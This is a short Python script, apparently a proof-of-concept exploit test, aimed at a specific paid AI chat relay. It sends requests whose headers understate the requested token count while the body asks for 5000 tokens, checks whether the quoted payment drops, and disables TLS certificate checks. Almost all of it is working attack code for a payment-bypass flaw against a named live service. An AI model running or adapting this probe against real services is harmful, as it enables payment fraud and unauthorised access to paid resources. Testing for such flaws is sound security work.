import http.client
import json
import ssl

host = "jumpgate.ambient.xyz"
path = "/paid/chat"

def jumpgate_exploit_test():
    # Test 1: High Body, Low Header
    payload = {
        "messages": [{"role": "user", "content": "Hello"}],
        "max_completion_tokens": 5000, # Requesting a lot of tokens
        "is_paid": True
    }
    
    headers_low = {
        "Content-Type": "application/json",
        "x402-input-tokens": "10",
        "x402-max-completion-tokens": "1" # Saying we only want 1 token
    }
    
    # Test 2: High Body, High Header
    headers_high = {
        "Content-Type": "application/json",
        "x402-input-tokens": "10",
        "x402-max-completion-tokens": "5000" # Honest value
    }

    context = ssl._create_unverified_context()
    
    def get_402_amount(headers):
        conn = http.client.HTTPSConnection(host, context=context)
        conn.request("POST", path, body=json.dumps(payload), headers=headers)
        response = conn.getresponse()
        data = response.read().decode("utf-8")
        try:
            res = json.loads(data)
            # Find the amount in the 402 response
            payment_req = res.get("paymentRequired", [{}])[0]
            return payment_req.get("amount")
        except:
            return f"Error/No JSON: {data[:100]}"

    print("Checking amount for Low Header (1 token)...")
    amt_low = get_402_amount(headers_low)
    print(f"Amount required: {amt_low}")
    
    print("\nChecking amount for High Header (5000 tokens)...")
    amt_high = get_402_amount(headers_high)
    print(f"Amount required: {amt_high}")
    
    if amt_low != amt_high:
        print("\nCRITICAL VULNERABILITY FOUND: Payment is calculated based on HEADERS, not the actual BODY request.")
        print("An attacker can bypass payment by providing low token count headers but high body limits.")
    else:
        print("\nRelayer is robust: Payment is correctly calculated based on the request body (or headers are strictly validated).")

if __name__ == "__main__":
    jumpgate_exploit_test()
